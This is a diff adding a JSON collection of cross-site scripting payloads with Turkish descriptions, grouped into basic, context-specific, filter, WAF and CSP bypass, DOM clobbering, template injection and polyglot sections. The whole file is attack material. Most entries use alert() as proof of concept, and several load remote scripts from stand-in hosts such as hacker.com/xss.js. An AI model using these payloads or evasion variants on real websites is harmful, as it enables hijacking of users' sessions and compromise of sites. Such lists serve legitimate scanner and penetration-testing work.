@@ -1,0 +1,337 @@
+{
+  "xss_basic_payloads": {
+    "desc": "Temel XSS payload'ları",
+    "payloads": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "<body onload=alert('XSS')>",
+      "<input type=text value='' autofocus onfocus=alert('XSS')>",
+      "<details open ontoggle=alert('XSS')>",
+      "<iframe srcdoc='<svg onload=alert(1)>'></iframe>",
+      "<video src=1 onerror=alert('XSS')>",
+      "<audio src=1 onerror=alert('XSS')>",
+      "<object data=data:text/html,<script>alert('XSS')></script>>",
+      "<embed src=data:text/html,<script>alert('XSS')></script>>"
+    ],
+    "category": "xss",
+    "type": "basic",
+    "security": "high_risk"
+  },
+  "xss_advanced_payloads": {
+    "desc": "Gelişmiş XSS payload'ları",
+    "payloads": [
+      "<script src=https://domain.com/evil.js></script>",
+      "<svg/onload=alert('XSS')>",
+      "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
+      "<img src=x onerror=eval('al'+'ert(1)')>",
+      "<img src=x onerror=eval(alert`1`) />",
+      "<img src=x onerror=Function`alert\\`1\\`` />",
+      "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
+      "<img src=x onerror=eval(String.fromCharCode(105,102,40,49,41,123,97,108,101,114,116,40,39,88,83,83,39,41,125))>",
+      "<svg><script>alert&#40;'XSS'&#41;</script></svg>",
+      "<img src=x onerror=alert?.('XSS')>",
+      "<img src=x onerror=alert?.('XSS') ?? 'nothing'>",
+      "<img src=x onerror=window[\\'alert\\']('XSS')>",
+      "<img src=x onerror=self[\\'alert\\']('XSS')>",
+      "<img src=x onerror=this[\\'alert\\']('XSS')>",
+      "<img\\x00src=x\\x00onerror=alert('XSS')>",
+      "<img src\\x00=x onerror=alert('XSS')>"
+    ],
+    "category": "xss",
+    "type": "advanced",
+    "security": "high_risk"
+  },
+  "xss_context_specific": {
+    "html_context": {
+      "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg onload=alert('XSS')>"
+      ],
+      "context": "HTML Body"
+    },
+    "javascript_context": {
+      "payloads": [
+        "';alert('XSS');//",
+        "';document.location='javascript:alert(\\'XSS\\')';//",
+        "';eval(atob('YWxlcnQoJ1hTUycp'));'",
+        "\");alert('XSS');//",
+        "' onmouseover='alert(\"XSS\")'"
+      ],
+      "context": "JavaScript String"
+    },
+    "attribute_context": {
+      "payloads": [
+        "\" onmouseover=alert('XSS') x=\"",
+        "' onmouseover=alert('XSS') x='",
+        "\"> <script>alert('XSS')</script> <\"",
+        "javascript:alert('XSS')"
+      ],
+      "context": "HTML Attribute"
+    },
+    "url_context": {
+      "payloads": [
+        "javascript:alert('XSS')",
+        "data:text/html,<script>alert('XSS')</script>",
+        "vbscript:alert('XSS')",
+        "{some_url}javascript:alert('XSS')"
+      ],
+      "context": "URL Parameter"
+    },
+    "category": "xss",
+    "type": "context_specific",
+    "security": "high_risk"
+  },
+  "xss_filter_bypass_techniques": {
+    "random_capitalization": {
+      "desc": "Rastgele harf büyütmeleri ile bypass",
+      "payloads": [
+        "<ScRiPt>alert('XSS')</ScRiPt>",
+        "<ImG src=x onerror=alert('XSS')>",
+        "<SvG onload=alert('XSS')>",
+        "<ScRiPt src=//hacker.com/xss.js></ScRiPt>",
+        "<aUtOcOmPlEtE onAcCePt=alert`XSS`>"
+      ],
+      "context": "Tag name case bypass"
+    },
+    "double_tag_techniques": {
+      "desc": "Çift etiket kullanımı ile bypass",
+      "payloads": [
+        "<script><script>alert('XSS')</script>",
+        "<scr<script>ipt>alert('XSS')</script>",
+        "<SCRscriptIPT>alert('XSS')</SCRscriptIPT>",
+        "<img/<script>src=xx:xx onerror=alert('XSS')>",
+        "<<script>alert('XSS');//<</script>"
+      ],
+      "context": "Filter bypass with double tags"
+    },
+    "special_separator_characters": {
+      "desc": "Boşluk yerine kullanılan özel karakterler",
+      "payloads": [
+        "<img/src=x/onerror=alert('XSS')>",
+        "<img/*%00*/src=x/*%00*/onerror=alert('XSS')>",
+        "<img/%00/src=x/%00/onerror=alert('XSS')>",
+        "<img%2Fsrc=x%2Fonerror=alert('XSS')>",
+        "<img%0Dsrc=x%0Donerror=alert('XSS')>",
+        "<img%0Csrc=x%0Conerror=alert('XSS')>",
+        "<img%0Asrc=x%0Aonerror=alert('XSS')>",
+        "<img%09src=x%09onerror=alert('XSS')>",
+        "<img%0Bsrc=x%0Bonerror=alert('XSS')>",
+        "<img%0Fsrc=x%0Fonerror=alert('XSS')>"
+      ],
+      "context": "Whitespace bypass"
+    },
+    "weird_attributes": {
+      "desc": "Garip attribute kullanımı",
+      "payloads": [
+        "<script x>alert('XSS')</script>",
+        "<script a='1234'>alert('XSS')</script>",
+        "<script ~~~>alert('XSS')</script>",
+        "<script/random>alert('XSS')</script>",
+        "<script\r\n>alert('XSS')</script>",
+        "<scr\\x00ipt>alert('XSS')</scr\\x00ipt>",
+        "<script/xss src=//hacker.com/xss.js>",
+        "<script x='1' y='a'>alert('XSS')</script>"
+      ],
+      "context": "Attribute bypass"
+    },
+    "template_literal_bypass": {
+      "desc": "Template literal ile parantez bypass",
+      "payloads": [
+        "onerror=alert`1`",
+        "onload=alert`XSS`",
+        "onmouseover=alert`XSS`",
+        "'onload='alert`XSS`",
+        "\"onload=\"alert`XSS`",
+        "javascript:alert`1`"
+      ],
+      "context": "Function call bypass"
+    }
+  },
+  "xss_csp_bypass": {
+    "desc": "CSP (Content Security Policy) bypass payload'ları",
+    "jsonp_endpoints": {
+      "desc": "JSONP endpoint'lerini XSS için kullanma",
+      "payloads": [
+        "https://target.com/api/jsonp?callback=alert('XSS')",
+        "https://target.com/api/jsonp?callback=1';alert('XSS')//",
+        "https://target.com/api/jsonp?callback=1);alert('XSS')//"
+      ],
+      "context": "JSONP callback XSS"
+    },
+    "whitelist_bypass": {
+      "desc": "CSP beyaz listesindeki domain'leri istismar etme",
+      "payloads": [
+        "https://target.com/vulnerable.js",
+        "https://cdn.target.com/xss.js",
+        "https://static.target.com/xss_payload.js"
+      ],
+      "context": "Whitelist domain abuse"
+    },
+    "data_uri": {
+      "desc": "Data URI ile script injection",
+      "payloads": [
+        "data:text/html,<script>alert('XSS')</script>",
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
+        "data:text/html,<svg onload=alert('XSS')>"
+      ],
+      "context": "Data URI XSS"
+    },
+    "blob_uri": {
+      "desc": "Blob URI ile script injection",
+      "payloads": [
+        "blob:https://target.com/uuid",
+        "javascript:var b=new Blob([\"<script>alert('XSS')</script>\"],{type:'text/html'});var url=URL.createObjectURL(b);location=url"
+      ],
+      "context": "Blob URI XSS"
+    }
+  },
+  "xss_modern_exploitation": {
+    "dom_clobbering": {
+      "desc": "HTML elemanlarıyla DOM yapısını değiştirme",
+      "payloads": [
+        "<a id=alert><b id=confirm><c id=prompt>",
+        "<a name=alert><b name=confirm><c name=prompt>",
+        "<form id=test><input name=elements><form id=test>",
+        "<base href='javascript:alert`XSS`' />"
+      ],
+      "context": "DOM manipulation"
+    },
+    "prototype_pollution": {
+      "desc": "JavaScript prototype'larını汚染 etme",
+      "payloads": [
+        "__proto__",
+        "constructor.prototype",
+        "Object.prototype.alert = function() { /* evil code */ }",
+        "user[constructor][prototype][xss]=1"
+      ],
+      "context": "JavaScript prototype manipulation"
+    },
+    "client_side_template_injection": {
+      "desc": "Client-side template injection",
+      "payloads": [
+        "{{7*7}}",
+        "{{7*'7'}}",
+        "{{this.constructor.constructor('alert(1)')()}}",
+        "{{#with 'test'.split('t')}}{{#each this}}{{this}}{{/each}}{{/with}}",
+        "${7*7}",
+        "#{7*7}"
+      ],
+      "context": "Template engine injection"
+    }
+  },
+  "xss_waf_bypass": {
+    "obfuscation_techniques": {
+      "desc": "WAF bypass için obfuscation teknikleri",
+      "payloads": [
+        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
+        "<img src=x onerror=eval(String.fromCharCode(105,102,40,49,41,123,97,108,101,114,116,40,39,88,83,83,39,41,125))>",
+        "<svg><script>alert&#40;'XSS'&#41;</script></svg>",
+        "<img src=x onerror=alert?.('XSS')>",
+        "<img src=x onerror=window[\\'alert\\']('XSS')>",
+        "<img src=x onerror=self[\\'alert\\']('XSS')>",
+        "<img src=x onerror=this[\\'alert\\']('XSS')>"
+      ],
+      "context": "WAF evasion"
+    },
+    "encoding_variations": {
+      "desc": "Farklı encoding teknikleri ile bypass",
+      "payloads": [
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "<img src=x onerror='alert\\x28\\x22XSS\\x22\\x29'>",
+        "<img src=x onerror=\"alert\\u0028'XSS'\\u0029\">",
+        "<script>eval(\\'alert(\\'XSS\\')\\')</script>",
+        "<img src=x onerror=alert(/XSS/.source)>"
+      ],
+      "context": "Encoding evasion"
+    },
+    "conditional_execution": {
+      "desc": "Koşullu XSS execution",
+      "payloads": [
+        "<img src=x onerror=if(1)alert('XSS')>",
+        "<img src=x onerror=try{alert('XSS')}catch(e){}>",
+        "<img src=x onerror=function x(){alert('XSS')}();>",
+        "<img src=x onerror=var a=function(){alert('XSS')};a();>"
+      ],
+      "context": "Conditional execution"
+    }
+  },
+  "xss_non_closing_tags": {
+    "desc": "Kapanmayan etiketlerle bypass",
+    "payloads": [
+      "<iframe SRC='javascript:alert(\"XSS\");'<",
+      "<iframe SRC='javascript:alert(\"XSS\");'//",
+      "<img src=x onerror=alert('XSS')<",
+      "<img src=x onerror=alert('XSS')//",
+      "<script src=//hacker.com/xss.js<",
+      "<script src=//hacker.com/xss.js//"
+    ],
+    "context": "Tag termination bypass"
+  },
+  "xss_unexpected_parent_tags": {
+    "desc": "Beklenmedik ana etiketler",
+    "payloads": [
+      "<svg><x><script>alert('XSS')</script></x></svg>",
+      "<svg><xss><script>alert('XSS')</script></xss></svg>",
+      "<math><x><script>alert('XSS')</script></x></math>",
+      "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>"
+    ],
+    "context": "Container bypass"
+  },
+  "xss_extra_open_techniques": {
+    "desc": "Fazladan açılış etiketleri",
+    "payloads": [
+      "<<script>alert('XSS');//<</script>",
+      "<<TexTArEa/*%00//%00*/a='not'/*%00///AutOFocUs////onFoCUS=alert`1` //",
+      "<</script/script><script>alert('XSS')</script>",
+      "<<img src=x onerror=alert('XSS')>>"
+    ],
+    "context": "Parser confusion"
+  },
+  "xss_multiple_bypass_combination": {
+    "desc": "Birden fazla bypass tekniğinin kombinasyonu",
+    "payloads": [
+      "<ScRiPt a='123'/*%00*/b='456'/*%00*/src='//hacker.com/xss.js'></ScRiPt>",
+      "<svg onload='/*%00*/alert/*%00*/(/*%00*/1/*%00*/)//'>",
+      "<<script//src='//hacker.com/xss.js'><//script>",
+      "<img src=x onerror='alert`XSS`' onmouseover='alert`XSS`'>",
+      "<ScRiPt a='123' b='456'/*%00*/src=//hacker.com/xss.js></ScRiPt>",
+      "<svg><x><ScRiPt a='123'/*%00*/b='456'/*%00*/src=//hacker.com/xss.js></ScRiPt></x></svg>"
+    ],
+    "context": "Multi-level bypass"
+  },
+  "xss_event_handlers": {
+    "desc": "Farklı event handler'larla XSS",
+    "payloads": [
+      "<img src=x onerror=alert('XSS')>",
+      "<img src=x oneonerrorrror=alert('XSS')>",
+      "<img src=x onerroro=alert('XSS')>",
+      "<img src=x onerror=alert('XSS') onmouseover=alert('XSS')>",
+      "<input onfocus=alert('XSS') autofocus>",
+      "<input onblur=alert('XSS') autofocus><input autofocus>",
+      "<marquee onstart=alert('XSS')>",
+      "<video onloadstart=alert('XSS') src=x>",
+      "<audio onloadstart=alert('XSS') src=x>",
+      "<object onload=alert('XSS') data=x>",
+      "<embed onload=alert('XSS') src=x>",
+      "<details ontoggle=alert('XSS') open>",
+      "<select onchange=alert('XSS')><option>1<option>2</select>",
+      "<textarea onfocus=alert('XSS') autofocus>",
+      "<keygen onfocus=alert('XSS') autofocus>"
+    ],
+    "context": "Event handler bypass"
+  },
+  "xss_polyglot_payloads": {
+    "desc": "Birden fazla context'te çalışan polyglot payload'lar",
+    "payloads": [
+      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></script><script>alert(String.fromCharCode(88,83,83))</script><img src=1 onerror=alert(String.fromCharCode(88,83,83))>",
+      "<?=alert(1)?>>",
+      "<?=alert(1)?>",
+      "<? alert(1) ?>",
+      "<% alert(1) %>"
+    ],
+    "context": "Multi-context XSS"
+  }
+}
